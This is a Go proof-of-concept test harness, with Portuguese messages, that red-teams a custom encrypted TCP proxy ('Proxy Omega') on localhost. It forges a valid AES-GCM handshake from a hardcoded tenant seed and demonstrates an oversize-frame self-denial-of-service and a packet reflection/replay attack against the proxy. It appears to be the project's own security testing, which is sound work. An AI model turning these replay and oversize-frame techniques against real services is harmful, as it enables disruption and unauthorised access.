package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

const tenantSeed = "CROM-SEC-TENANT-ALPHA-2026"
const backendHost = "127.0.0.1:8080"
const proxyHost = "127.0.0.1:9999"

func getAEAD() cipher.AEAD {
	mac := hmac.New(sha256.New, []byte(tenantSeed))
	mac.Write([]byte("CROM_AES_GCM_KEY_V4"))
	key := mac.Sum(nil)
	block, _ := aes.NewCipher(key)
	aead, _ := cipher.NewGCM(block)
	return aead
}

func writeFramedPacket(conn net.Conn, packet []byte) error {
	frame := make([]byte, 2+len(packet))
	binary.BigEndian.PutUint16(frame[:2], uint16(len(packet)))
	copy(frame[2:], packet)
	_, err := conn.Write(frame)
	return err
}

func readFramedPacket(conn net.Conn) ([]byte, error) {
	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return nil, err
	}
	packetLen := binary.BigEndian.Uint16(lenBuf)
	if packetLen > 35000 {
		return nil, fmt.Errorf("length buffer oversize attack: %d bytes", packetLen)
	}
	packetBuf := make([]byte, packetLen)
	if _, err := io.ReadFull(conn, packetBuf); err != nil {
		return nil, err
	}
	return packetBuf, nil
}

func main() {
    log.SetOutput(os.Stdout)
	fmt.Println("=============================================================")
	fmt.Println(" 🚀 INICIANDO TESTES RED TEAM PROOF (CROM-SEC GEN-6) 🚀")
	fmt.Println("=============================================================")

	// 1. Iniciar mock backend
	go func() {
		l, err := net.Listen("tcp", backendHost)
		if err != nil {
			log.Fatal(err)
		}
		for {
			conn, _ := l.Accept()
			go func(c net.Conn) {
                // 1. Dispara payload grande (32KB MAX) para sobrecarregar lógica de rede
                bigData := make([]byte, 32768)
                for i := range bigData { bigData[i] = 'A' }
                c.Write(bigData)
                
                // 2. Aguarda injeções refletidas
				buf := make([]byte, 1024)
				n, err := c.Read(buf)
				if err == nil && n > 0 {
					fmt.Printf("\n[🚨 SUCESSO EXPLOIT VULN-1] BACKEND RECEBEU TEXTO INJETADO POR REFLEXÃO!\n---> '%s'\n", string(buf[:30]))
				}
			}(conn)
		}
	}()

	// 2. Iniciar Proxy Omega
	proxyCmd := exec.Command("go", "run", "simulators/dropin_tcp/proxy_universal_out.go")
	proxyCmd.Dir = "/home/j/Documentos/GitHub/crompressor-security"
	stdin, _ := proxyCmd.StdinPipe()
	proxyCmd.Stdout = os.Stdout
	// Ignore EOF stderr in this PoC
	proxyCmd.Start()
	stdin.Write([]byte(tenantSeed + "\n"))
	time.Sleep(2 * time.Second)

    fmt.Println("\n[*] --- TESTE VULN-3: SELF-DOS (OOB LENGTH) ---")
    fmt.Printf("[*] Conectando ao Proxy Omega em %s simulando Alpha Client...\n", proxyHost)
    alphaConn, err := net.Dial("tcp", proxyHost)
    if err != nil {
        log.Fatal("Proxy não disponível")
    }

    // Criar pacote valido para estabelecer tunel e permitir retorno de dados
    aead := getAEAD()
    nonce := make([]byte, aead.NonceSize())
    rand.Read(nonce)
    tsBytes := make([]byte, 8)
    binary.BigEndian.PutUint64(tsBytes, uint64(time.Now().Unix()))
    aad := append([]byte("CROM"), 'C')
    aad = append(aad, tsBytes...)
    sealed := aead.Seal(nil, nonce, []byte("INIT"), aad)
    packet := append([]byte("CROM"), 'C')
    packet = append(packet, tsBytes...)
    packet = append(packet, nonce...)
    packet = append(packet, sealed...)

    fmt.Println("[*] Enviando handshake TCP para abrir stream L7.")
    writeFramedPacket(alphaConn, packet)

    // Lendo a cru para ver o Prefix-Length formatado pelo servidor
    lenBuf := make([]byte, 2)
    io.ReadFull(alphaConn, lenBuf)
    pacLen := binary.BigEndian.Uint16(lenBuf)
    fmt.Printf("[!] Proxy Omega gerou pacote final com Length Header: %d bytes\n", pacLen)
    if pacLen > 32768 {
        fmt.Printf("[🧨 SUCESSO DO EXPLOIT VULN-3] O limite oficial \"> 32768\" do cliente foi furado por tráfego válido do servidor. O Cliente panicaria ao processar!\n")
    }

    serverPayload := make([]byte, pacLen)
    io.ReadFull(alphaConn, serverPayload)
    
    fmt.Println("\n[*] --- TESTE VULN-1: REFLECTION ATTACK ---")
    fmt.Println("[*] Refletindo este mesmo pacote (criado pelo Proxy Omega) diretamente DE VOLTA para ele via nova stream...")
    
    reflexConn, _ := net.Dial("tcp", proxyHost)
    frame := make([]byte, 2+pacLen)
    binary.BigEndian.PutUint16(frame[:2], pacLen)
    copy(frame[2:], serverPayload)
    reflexConn.Write(frame)
    
    time.Sleep(2 * time.Second)
    fmt.Println("\n[*] Desligando instâncias simuladas.")
	proxyCmd.Process.Kill()
}
